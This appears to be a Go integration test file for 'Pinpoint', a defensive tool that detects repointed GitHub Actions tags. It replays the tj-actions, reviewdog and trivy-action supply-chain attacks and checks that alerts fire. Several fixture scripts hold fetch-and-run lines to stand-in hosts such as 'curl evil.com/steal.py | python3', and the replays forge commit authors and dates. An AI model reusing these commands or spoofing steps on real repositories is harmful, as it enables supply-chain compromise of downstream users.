// Copyright (C) 2026 CoreWeave, Inc.
// SPDX-License-Identifier: GPL-3.0-only

//go:build integration

package harness

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestReplay_TJActions recreates the tj-actions/changed-files attack (CVE-2025-30066).
// All 20 tags repointed to a single malicious commit with backdated author.
func TestReplay_TJActions(t *testing.T) {
	h := NewTestHelper(t)
	repo := "replay-tj-actions"
	fullRepo := h.org + "/" + repo

	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	// Create legitimate entrypoint
	blob := h.CreateBlob(t, repo, "#!/bin/bash\necho 'legitimate action'\n")
	baseTree := h.GetCommitTree(t, repo, mainSHA)
	tree := h.CreateTree(t, repo, baseTree, map[string]string{"entrypoint.sh": blob})

	// Create 20 tags (v1 through v20) on a chain of commits
	var tagNames []string
	for i := 1; i <= 20; i++ {
		tagNames = append(tagNames, fmt.Sprintf("v%d", i))
	}
	tagSHAs, lastSHA := h.CreateBulkTags(t, repo, tagNames, mainSHA, tree)
	h.UpdateBranch(t, repo, "main", lastSHA)

	// Commit workflow + manifest to repo so gate can fetch them
	gateSHA := h.CommitGateFiles(t, repo, fullRepo, tagSHAs)

	time.Sleep(3 * time.Second)

	// Baseline scan
	cfg := WriteMultiRepoConfig(t, map[string][]string{fullRepo: tagNames})
	state := t.TempDir() + "/state.json"
	_, code := RunPinpointScan(t, cfg, state)
	if code != 0 {
		t.Fatal("Baseline scan should succeed with exit 0")
	}

	// Attack: create malicious commit with backdated date and spoofed author
	evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\n# renovate[bot] update\ncurl evil.com/steal.py | python3\n")
	evilTree := h.CreateTree(t, repo, baseTree, map[string]string{"entrypoint.sh": evilBlob})
	backdatedDate := time.Now().Add(-90 * 24 * time.Hour).UTC().Format(time.RFC3339)
	evilCommit := h.CreateCommitWithAuthor(t, repo, "chore(deps): update dependency",
		evilTree, []string{mainSHA}, "renovate[bot]", "renovate@bot.com", backdatedDate)

	// Repoint ALL 20 tags to the single malicious commit
	for _, tag := range tagNames {
		h.RepointTag(t, repo, tag, evilCommit)
	}

	time.Sleep(3 * time.Second)

	// Detection scan
	output, code := RunPinpointScan(t, cfg, state)
	if code != 2 {
		t.Fatalf("Expected exit code 2 (alert detected), got %d. Output:\n%s", code, output)
	}

	assertContains(t, output, "TAG_REPOINTED")
	assertContains(t, output, "MASS_REPOINT")
	assertContains(t, output, "CRITICAL")

	repointCount := strings.Count(output, "TAG_REPOINTED")
	if repointCount < 20 {
		t.Errorf("Expected 20 TAG_REPOINTED alerts, got %d", repointCount)
	}

	// Gate verification — gate fetches workflow+manifest from the repo via API
	gateOutput, gateCode := RunPinpointGate(t, ".pinpoint-manifest.json",
		fullRepo, gateSHA,
		fullRepo+"/.github/workflows/ci.yml@refs/heads/main")
	if gateCode != 2 {
		t.Fatalf("Gate should detect violations (exit 2), got %d. Output:\n%s", gateCode, gateOutput)
	}
	assertContains(t, gateOutput, "TAG HAS BEEN REPOINTED")
}

// TestReplay_Reviewdog recreates the reviewdog/action-setup attack (CVE-2025-30154).
// Single major version tag repointed to descendant with large size change.
func TestReplay_Reviewdog(t *testing.T) {
	h := NewTestHelper(t)
	repo := "replay-reviewdog"
	fullRepo := h.org + "/" + repo

	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	// Create small legitimate action.yml (~50 bytes)
	smallContent := "name: 'action-setup'\ndescription: 'Setup'\nruns:\n  using: node20\n"
	smallBlob := h.CreateBlob(t, repo, smallContent)
	baseTree := h.GetCommitTree(t, repo, mainSHA)
	tree1 := h.CreateTree(t, repo, baseTree, map[string]string{"action.yml": smallBlob})
	goodCommit := h.CreateCommit(t, repo, "v1 release", tree1, []string{mainSHA})
	h.UpdateBranch(t, repo, "main", goodCommit)
	h.CreateLightweightTag(t, repo, "v1", goodCommit)

	// Commit workflow + manifest for gate
	gateSHA := h.CommitGateFiles(t, repo, fullRepo, map[string]string{"v1": goodCommit})

	time.Sleep(3 * time.Second)

	// Baseline scan
	cfg := writeConfig(t, fullRepo, []string{"v1"})
	state := t.TempDir() + "/state.json"
	_, code := RunPinpointScan(t, cfg, state)
	if code != 0 {
		t.Fatal("Baseline scan should succeed with exit 0")
	}

	// Attack: create descendant commit with action.yml 4x larger
	bigContent := smallContent + strings.Repeat("# malicious payload padding\n", 100)
	bigBlob := h.CreateBlob(t, repo, bigContent)
	tree2 := h.CreateTree(t, repo, baseTree, map[string]string{"action.yml": bigBlob})
	maliciousCommit := h.CreateCommit(t, repo, "Update dependencies", tree2, []string{goodCommit})
	h.UpdateBranch(t, repo, "main", maliciousCommit)

	// Repoint v1 to descendant commit
	h.RepointTag(t, repo, "v1", maliciousCommit)

	time.Sleep(3 * time.Second)

	// Detection scan
	output, code := RunPinpointScan(t, cfg, state)
	if code != 2 {
		t.Fatalf("Expected exit code 2, got %d. Output:\n%s", code, output)
	}
	assertContains(t, output, "TAG_REPOINTED")
	assertContains(t, output, "CRITICAL")

	// Gate verification
	gateOutput, gateCode := RunPinpointGate(t, ".pinpoint-manifest.json",
		fullRepo, gateSHA,
		fullRepo+"/.github/workflows/ci.yml@refs/heads/main")
	if gateCode != 2 {
		t.Fatalf("Gate should detect violation (exit 2), got %d. Output:\n%s", gateCode, gateOutput)
	}
	assertContains(t, gateOutput, "TAG HAS BEEN REPOINTED")
}

// TestReplay_Trivy recreates the aquasecurity/trivy-action attack (March 2026).
// 75 of 76 tags repointed with forged commit metadata and huge entry point change.
func TestReplay_Trivy(t *testing.T) {
	h := NewTestHelper(t)
	repo := "replay-trivy"
	fullRepo := h.org + "/" + repo

	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	// Create small legitimate entrypoint.sh (~100 bytes)
	smallEntry := "#!/bin/bash\nset -e\ntrivy image --severity HIGH,CRITICAL \"$INPUT_IMAGE\"\n" + strings.Repeat(" ", 40)
	smallBlob := h.CreateBlob(t, repo, smallEntry)
	baseTree := h.GetCommitTree(t, repo, mainSHA)
	tree := h.CreateTree(t, repo, baseTree, map[string]string{"entrypoint.sh": smallBlob})

	// Create 76 tags with simplified semver names
	var tagNames []string
	for i := 1; i <= 76; i++ {
		major := i / 10
		minor := i % 10
		tagNames = append(tagNames, fmt.Sprintf("0.%d.%d", major, minor))
	}
	tagSHAs, lastSHA := h.CreateBulkTags(t, repo, tagNames, mainSHA, tree)
	h.UpdateBranch(t, repo, "main", lastSHA)

	cleanTag := tagNames[len(tagNames)-1]

	// Commit workflow + manifest for gate
	gateSHA := h.CommitGateFiles(t, repo, fullRepo, tagSHAs)

	time.Sleep(5 * time.Second)

	// Baseline scan
	cfg := WriteMultiRepoConfig(t, map[string][]string{fullRepo: tagNames})
	state := t.TempDir() + "/state.json"
	_, code := RunPinpointScan(t, cfg, state)
	if code != 0 {
		t.Fatal("Baseline scan should succeed with exit 0")
	}

	// Attack: create malicious commit with forged metadata and big entry point
	bigEntry := "#!/bin/bash\nset -e\n" + strings.Repeat("# credential stealer stage\ncurl -s https://evil.example.com/payload | base64 -d | bash\n", 10)
	bigBlob := h.CreateBlob(t, repo, bigEntry)
	evilTree := h.CreateTree(t, repo, baseTree, map[string]string{"entrypoint.sh": bigBlob})
	evilCommit := h.CreateCommitWithAuthor(t, repo, "Update scanner engine",
		evilTree, []string{mainSHA}, "DmitriyLewen", "dmitriy@aquasec.com", "2024-07-09T10:30:00Z")

	// Repoint 75 tags (all except clean)
	for _, tag := range tagNames {
		if tag == cleanTag {
			continue
		}
		h.RepointTag(t, repo, tag, evilCommit)
	}

	time.Sleep(5 * time.Second)

	// Detection scan
	output, code := RunPinpointScan(t, cfg, state)
	if code != 2 {
		t.Fatalf("Expected exit code 2 (alert detected), got %d. Output:\n%s", code, output)
	}

	assertContains(t, output, "TAG_REPOINTED")
	assertContains(t, output, "MASS_REPOINT")
	assertContains(t, output, "CRITICAL")

	repointCount := strings.Count(output, "TAG_REPOINTED")
	if repointCount < 75 {
		t.Errorf("Expected at least 75 TAG_REPOINTED alerts, got %d", repointCount)
	}

	// Gate verification
	gateOutput, gateCode := RunPinpointGate(t, ".pinpoint-manifest.json",
		fullRepo, gateSHA,
		fullRepo+"/.github/workflows/ci.yml@refs/heads/main")
	if gateCode != 2 {
		t.Fatalf("Gate should detect violations (exit 2), got %d. Output:\n%s", gateCode, gateOutput)
	}
	assertContains(t, gateOutput, "TAG HAS BEEN REPOINTED")
}

// TestReplay_ChainedAttack recreates the spotbugs → reviewdog → tj-actions chain.
// Two repos repointed independently, both detected in a single scan.
func TestReplay_ChainedAttack(t *testing.T) {
	h := NewTestHelper(t)
	upstream := "replay-chain-upstream"
	downstream := "replay-chain-downstream"

	// Create upstream repo
	upstreamMainSHA := h.CreateRepo(t, upstream)
	defer h.DeleteRepo(t, upstream)
	upBlob := h.CreateBlob(t, upstream, "#!/bin/bash\necho upstream\n")
	upBaseTree := h.GetCommitTree(t, upstream, upstreamMainSHA)
	upTree := h.CreateTree(t, upstream, upBaseTree, map[string]string{"entrypoint.sh": upBlob})
	upGoodCommit := h.CreateCommit(t, upstream, "Upstream v1", upTree, []string{upstreamMainSHA})
	h.UpdateBranch(t, upstream, "main", upGoodCommit)
	h.CreateLightweightTag(t, upstream, "v1", upGoodCommit)

	// Create downstream repo
	downstreamMainSHA := h.CreateRepo(t, downstream)
	defer h.DeleteRepo(t, downstream)
	downBlob := h.CreateBlob(t, downstream, "#!/bin/bash\necho downstream\n")
	downBaseTree := h.GetCommitTree(t, downstream, downstreamMainSHA)
	downTree := h.CreateTree(t, downstream, downBaseTree, map[string]string{"entrypoint.sh": downBlob})
	downGoodCommit := h.CreateCommit(t, downstream, "Downstream v1", downTree, []string{downstreamMainSHA})
	h.UpdateBranch(t, downstream, "main", downGoodCommit)
	h.CreateLightweightTag(t, downstream, "v1", downGoodCommit)

	time.Sleep(3 * time.Second)

	// Baseline scan for both
	cfg := WriteMultiRepoConfig(t, map[string][]string{
		h.org + "/" + upstream:   {"v1"},
		h.org + "/" + downstream: {"v1"},
	})
	state := t.TempDir() + "/state.json"
	_, code := RunPinpointScan(t, cfg, state)
	if code != 0 {
		t.Fatal("Baseline scan should succeed with exit 0")
	}

	// Attack: repoint upstream v1
	upEvilBlob := h.CreateBlob(t, upstream, "#!/bin/bash\ncurl evil.com/upstream | bash\n")
	upEvilTree := h.CreateTree(t, upstream, upBaseTree, map[string]string{"entrypoint.sh": upEvilBlob})
	upEvilCommit := h.CreateCommit(t, upstream, "Evil upstream", upEvilTree, []string{upstreamMainSHA})
	h.RepointTag(t, upstream, "v1", upEvilCommit)

	// Attack: repoint downstream v1
	downEvilBlob := h.CreateBlob(t, downstream, "#!/bin/bash\ncurl evil.com/downstream | bash\n")
	downEvilTree := h.CreateTree(t, downstream, downBaseTree, map[string]string{"entrypoint.sh": downEvilBlob})
	downEvilCommit := h.CreateCommit(t, downstream, "Evil downstream", downEvilTree, []string{downstreamMainSHA})
	h.RepointTag(t, downstream, "v1", downEvilCommit)

	time.Sleep(3 * time.Second)

	// Detection scan
	output, code := RunPinpointScan(t, cfg, state)
	if code != 2 {
		t.Fatalf("Expected exit code 2, got %d. Output:\n%s", code, output)
	}

	assertContains(t, output, upstream)
	assertContains(t, output, downstream)

	repointCount := strings.Count(output, "TAG_REPOINTED")
	if repointCount != 2 {
		t.Errorf("Expected exactly 2 TAG_REPOINTED alerts, got %d", repointCount)
	}

	criticalCount := strings.Count(output, "CRITICAL")
	if criticalCount < 2 {
		t.Errorf("Expected at least 2 CRITICAL alerts, got %d", criticalCount)
	}
}

// TestGate_LiveVerification tests the gate against a real repo with a real manifest.
func TestGate_LiveVerification(t *testing.T) {
	h := NewTestHelper(t)
	repo := "test-gate-live"
	fullRepo := h.org + "/" + repo

	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	// Create a repo with a tag
	blob := h.CreateBlob(t, repo, "#!/bin/bash\necho ok\n")
	baseTree := h.GetCommitTree(t, repo, mainSHA)
	tree := h.CreateTree(t, repo, baseTree, map[string]string{"entrypoint.sh": blob})
	goodCommit := h.CreateCommit(t, repo, "v1.0.0 release", tree, []string{mainSHA})
	h.UpdateBranch(t, repo, "main", goodCommit)
	h.CreateLightweightTag(t, repo, "v1.0.0", goodCommit)

	// Commit workflow + manifest to repo
	gateSHA := h.CommitGateFiles(t, repo, fullRepo, map[string]string{"v1.0.0": goodCommit})

	time.Sleep(3 * time.Second)

	// Gate should pass — tag matches manifest
	gateOutput, gateCode := RunPinpointGate(t, ".pinpoint-manifest.json",
		fullRepo, gateSHA,
		fullRepo+"/.github/workflows/ci.yml@refs/heads/main")
	if gateCode != 0 {
		t.Fatalf("Gate should pass (exit 0), got %d. Output:\n%s", gateCode, gateOutput)
	}
	assertContains(t, gateOutput, "matches manifest")

	// Tamper: repoint tag
	evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\ncurl evil.com | bash\n")
	evilTree := h.CreateTree(t, repo, baseTree, map[string]string{"entrypoint.sh": evilBlob})
	evilCommit := h.CreateCommit(t, repo, "Evil", evilTree, []string{mainSHA})
	h.RepointTag(t, repo, "v1.0.0", evilCommit)

	time.Sleep(3 * time.Second)

	// Gate should now detect the violation (same gateSHA still has the old manifest)
	gateOutput2, gateCode2 := RunPinpointGate(t, ".pinpoint-manifest.json",
		fullRepo, gateSHA,
		fullRepo+"/.github/workflows/ci.yml@refs/heads/main")
	if gateCode2 != 2 {
		t.Fatalf("Gate should detect violation (exit 2), got %d. Output:\n%s", gateCode2, gateOutput2)
	}
	assertContains(t, gateOutput2, "TAG HAS BEEN REPOINTED")
}

// TestAudit_LiveOrg runs pinpoint audit against the pinpoint-testing org.
func TestAudit_LiveOrg(t *testing.T) {
	output, code := RunPinpointAudit(t, "pinpoint-testing", "report")
	if code != 0 {
		t.Fatalf("Audit should succeed (exit 0), got %d. Output:\n%s", code, output)
	}

	assertContains(t, output, "PINPOINT AUDIT: pinpoint-testing")
	assertContains(t, output, "Repos scanned:")

	// Also test JSON output
	jsonOutput, jsonCode := RunPinpointAudit(t, "pinpoint-testing", "json")
	if jsonCode != 0 {
		t.Fatalf("Audit JSON should succeed (exit 0), got %d. Output:\n%s", jsonCode, jsonOutput)
	}

	// Find the JSON object in combined output (stderr progress + stdout JSON)
	var parsed map[string]interface{}
	jsonStart := strings.Index(jsonOutput, "{")
	if jsonStart < 0 {
		t.Fatalf("No JSON found in audit output:\n%s", jsonOutput)
	}
	jsonStr := jsonOutput[jsonStart:]
	if err := json.Unmarshal([]byte(jsonStr), &parsed); err != nil {
		t.Fatalf("Invalid JSON output: %v\nOutput:\n%s", err, jsonStr)
	}
	if parsed["org"] != "pinpoint-testing" {
		t.Errorf("Expected org=pinpoint-testing, got %v", parsed["org"])
	}
}

// TestManifest_LiveRefresh tests the manifest refresh/verify lifecycle against live API.
func TestManifest_LiveRefresh(t *testing.T) {
	h := NewTestHelper(t)
	repo := "test-manifest-live"
	fullRepo := h.org + "/" + repo

	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	// Create a tag
	blob := h.CreateBlob(t, repo, "#!/bin/bash\necho ok\n")
	baseTree := h.GetCommitTree(t, repo, mainSHA)
	tree := h.CreateTree(t, repo, baseTree, map[string]string{"entrypoint.sh": blob})
	goodCommit := h.CreateCommit(t, repo, "v1.0.0", tree, []string{mainSHA})
	h.UpdateBranch(t, repo, "main", goodCommit)
	h.CreateLightweightTag(t, repo, "v1.0.0", goodCommit)

	time.Sleep(3 * time.Second)

	// Create initial manifest with the known-good SHA
	manifestPath := filepath.Join(t.TempDir(), "manifest.json")
	WriteManifestJSON(t, manifestPath, map[string]map[string]string{
		fullRepo: {"v1.0.0": goodCommit},
	})

	// Verify should pass (no drift)
	verifyOutput, verifyCode := RunPinpointManifestVerify(t, manifestPath)
	if verifyCode != 0 {
		t.Fatalf("Verify should pass (exit 0), got %d. Output:\n%s", verifyCode, verifyOutput)
	}

	// Advance the tag legitimately
	blob2 := h.CreateBlob(t, repo, "#!/bin/bash\necho patched\n")
	tree2 := h.CreateTree(t, repo, baseTree, map[string]string{"entrypoint.sh": blob2})
	newCommit := h.CreateCommit(t, repo, "v1.0.0 patch", tree2, []string{goodCommit})
	h.UpdateBranch(t, repo, "main", newCommit)
	h.RepointTag(t, repo, "v1.0.0", newCommit)

	time.Sleep(3 * time.Second)

	// Verify should detect drift (exit 3)
	verifyOutput2, verifyCode2 := RunPinpointManifestVerify(t, manifestPath)
	if verifyCode2 != 3 {
		t.Fatalf("Verify should detect drift (exit 3), got %d. Output:\n%s", verifyCode2, verifyOutput2)
	}

	// Refresh should update the manifest (exit 3 = changes written)
	refreshOutput, refreshCode := RunPinpointManifestRefresh(t, manifestPath, "")
	if refreshCode != 3 {
		t.Fatalf("Refresh should write changes (exit 3), got %d. Output:\n%s", refreshCode, refreshOutput)
	}

	// Verify again — should pass now (exit 0)
	verifyOutput3, verifyCode3 := RunPinpointManifestVerify(t, manifestPath)
	if verifyCode3 != 0 {
		t.Fatalf("Verify after refresh should pass (exit 0), got %d. Output:\n%s", verifyCode3, verifyOutput3)
	}

	// Confirm the manifest on disk has the new SHA
	manifestData, err := os.ReadFile(manifestPath)
	if err != nil {
		t.Fatalf("Failed to read manifest: %v", err)
	}
	if !strings.Contains(string(manifestData), newCommit) {
		t.Errorf("Manifest should contain new commit SHA %s", newCommit)
	}
}
